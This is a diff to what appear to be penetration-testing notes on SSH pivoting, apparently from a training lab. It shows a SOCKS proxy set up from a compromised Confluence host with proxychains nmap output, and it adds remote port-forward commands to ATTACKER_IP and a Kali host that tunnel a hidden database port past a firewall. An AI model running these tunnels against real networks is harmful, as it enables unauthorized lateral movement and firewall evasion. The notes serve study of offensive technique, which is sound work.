@@ -1,5 +1,5 @@
 
-
+## Global note: make sure a full TTY is enabled before using `OpenSSH`.
 ### Local port forwarding
 
 ``` 
@@ -19,7 +19,7 @@ ssh -N -D 0.0.0.0:9999 USERNAME@HIDDEN_MACHINE           // Run from the remote 
 proxychains nmap -n -sT --top-port=10 HIDDEN_MACHINE_REACHABLE_IP        // make sure to use '-n' and '-sT'
 ```
 Note: make sure to use `proxychains` before every network command.
-
+###### Example output
 ```
 confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.217.215
 Could not create directory '/home/confluence/.ssh'.
@@ -65,4 +65,22 @@ PORT     STATE  SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 105.67 seconds
 
 
+```
+
+
+
+### Remote port forwarding
+When there is a firewall involved, nearly any inbound connections can be blocked. Usually, outbound connections are allowed though.
+Remote port forwards work nearly the same as Local port forwards, but the SSH connection has the remote host as the "sender", while taking the attacking machine as the "reciever". This way, the traffic will be marked as outbound to the firewall.
+This system works very similarly to a reverse shell, and is usually implemented when the attacker found credentials for a hidden host, but cannot connect to it because of the firewall.
+
+```
+ssh -N -R 127.0.0.1:ATTACKER_LOCAL_PORT:HIDDEN_TARGET_IP:HIDDEN_TARGET_PORT ATTACKER_USERNAME@ATTACKER_IP
+```
+
+Note: make sure the local SSH server is open and `PasswordAuthentication` is set to `yes` in `/etc/ssh/sshd_config`, and `OpenSSH` is started using `systemctl start ssh`.
+
+
+```
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
 ```
